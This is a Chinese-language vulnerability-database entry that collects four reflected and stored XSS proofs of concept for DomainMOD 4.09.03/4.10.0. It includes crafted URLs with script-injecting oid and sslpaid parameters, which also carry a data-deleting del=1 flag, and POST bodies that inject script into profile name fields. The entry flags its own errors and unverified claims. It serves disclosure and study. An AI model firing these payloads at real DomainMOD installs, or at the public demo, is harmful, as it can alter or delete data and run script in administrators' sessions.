---
source: "Mr-xn/Penetration_Testing_POC"
title: "DomainMOD 四参数反射/存储XSS集合"
product: "DomainMOD"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-11403;CVE-2018-11404;CVE-2018-11558;CVE-2018-11559"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "4.09.03/4.10.0，需登录/管理员查看"
prerequisites: "登录用户输入，受害者上下文"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/DomainMod/DomainMod%E7%9A%84XSS%E9%9B%86%E5%90%88.md"
id: "vw-a843e10741bb8e53cec95a5b"
entity_id: "ve-a843e10741bb8e53cec95a5b"
schema_version: "1"
---

# DomainMOD 四参数反射/存储XSS集合

## 条目说明

- 对象与具体问题：DomainMOD；四参数反射/存储XSS集合
- 版本、配置及部署条件：4.09.03/4.10.0，需登录/管理员查看
- 认证与权限前提：登录用户输入，受害者上下文
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 编号到参数映射须核不能猜
- 反射XSS段误称CSRF测试；del=1路由可能删除，需标副作用
- profile姓名存储XSS修改用户资料，管理员查看为触发条件
- 公共demo域应换示例，缺固定版和响应证据

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

#### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|DomainMod的XSS|2018-05-24|longer/套哥（taoge@5ecurity.cn）|[https://github.com/domainmod/domainmod](https://github.com/domainmod/domainmod) | [https://github.com/domainmod/domainmod](https://github.com/domainmod/domainmod) |4.09.03/4.10.0| [CVE-2018-11403](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11403)/[CVE-2018-11403](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11403)/[CVE-2018-11404](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11404)/[CVE-2018-11558](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11558)/[CVE-2018-11559](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11559)|  

##### 漏洞概述  

> DomainMod v4.09.03版本和v4.10.0版本 存在XSS的页面  


#### POC实现代码如下：  

> DomainMod v4.09.03版本的“assets/edit/account-owner.php”页面的“oid”参数存在一个XSS漏洞，当用户登陆后访问url`http://127.0.0.1/assets/edit/account-owner.php?del=1&oid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28973761%29%3C/ScRiPt%3E`，会触发XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/63)告知作者。

>CSRF测试页面代码如下：  
``` html
http://127.0.0.1/assets/edit/account-owner.php?del=1&oid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28973761%29%3C/ScRiPt%3E
```
> DomainMod v4.09.03版本的“assets/edit/ssl-provider-account.php”页面的“sslpaid”参数存在一个XSS漏洞，当用户登陆后访问url`http://127.0.0.1/assets/edit/ssl-provider-account.php?del=1&sslpaid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28931289%29%3C/ScRiPt%3E`，会触发XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/63)告知作者。

>CSRF测试页面代码如下：  
``` html
http://127.0.0.1/assets/edit/ssl-provider-account.php?del=1&sslpaid=%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28931289%29%3C/ScRiPt%3E
```
> DomainMod 4.10.0版本的“/settings/profile/index.php”页面的“new_first_name”参数过滤不严格导致存在一个XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/66)告知作者。

>用户登陆后提交如下数据包，更改用户信息后，当管理员查看用户是XSS漏洞触发：  
``` raw
post url https://demo.domainmod.org/settings/profile/
post data:new_first_name=test%22%3E%3Cscript%3Ealert%28%2F1111%2F%29%3C%2Fscript%3E&new_last_name=test&new_email_address=test%40test.com&new_currency=USD&new_timezone=Canada%2FPacific&new_expiration_emails=0
```
> DomainMod 4.10.0版本的“/settings/profile/index.php”页面的“new_last_name”参数过滤不严格导致存在一个存储型XSS漏洞。DomainMod是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/domainmod/domainmod/issues/66)告知作者。

>用户登陆后提交如下数据包，更改用户信息后，当管理员查看用户是XSS漏洞触发：  
``` raw
post url https://demo.domainmod.org/settings/profile/
post data:new_first_name=test&new_last_name=test%22%3E%3Cscript%3Ealert%28%2F1111%2F%29%3C%2Fscript%3E&new_email_address=test%40test.com&new_currency=USD&new_timezone=Canada%2FPacific&new_expiration_emails=0
```


---

> 来源：Mr-xn/Penetration_Testing_POC
